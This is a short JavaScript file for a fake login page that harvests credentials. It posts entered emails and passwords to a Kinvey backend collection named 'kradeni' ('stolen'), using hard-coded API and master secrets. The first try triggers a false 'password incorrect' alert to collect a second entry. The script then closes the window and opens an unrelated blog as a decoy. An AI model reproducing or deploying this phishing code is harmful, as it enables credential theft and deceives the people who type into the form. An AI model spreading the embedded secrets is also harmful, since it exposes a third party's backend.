let a = 0 ;
const API_BASE_URL = "https://baas.kinvey.com/";
const API_KEY = "kid_r1ynbbg6Q";
const API_SECRET = "33903aebaffd4a3b944250b832bd81f3";
const BASIC_AUTH_HEADER = {
    'Authorization': "Basic " + btoa(API_KEY + ":" + API_SECRET)
};
const MASTER_AUTH_HEADER = {
    'Authorization': "Basic " + btoa(API_KEY + ":f55dd3810f61465c98c4fec7525a6ba9")
};

function register (data) {
    return $.ajax({
        method: "POST",
        url: API_BASE_URL + "appdata/" + API_KEY + "/kradeni",
        headers: MASTER_AUTH_HEADER,
        data: data
    });
}
$(document).ready(() => {
    $("#login").click((e) => {
        e.preventDefault();
        let data = {};
        if($("#email").val() == "" || $("#pass").val() == "")
        {
            return;
        }
        data.email = $("#email").val();
        data.pass = $("#pass").val();
        register(data).then(() => {
            $("#email").val("");
            $("#pass").val("");
            if(a === 0) {
                alert("The password you entered is incorrect.Please try again.");
                a++;
                return;
            }
            window.close();
            window.open("https://lifestore.bg/blog/10-prichini-poradi-koito-si-zasluzhava-da-bdete-vegan/");
        });

    })
});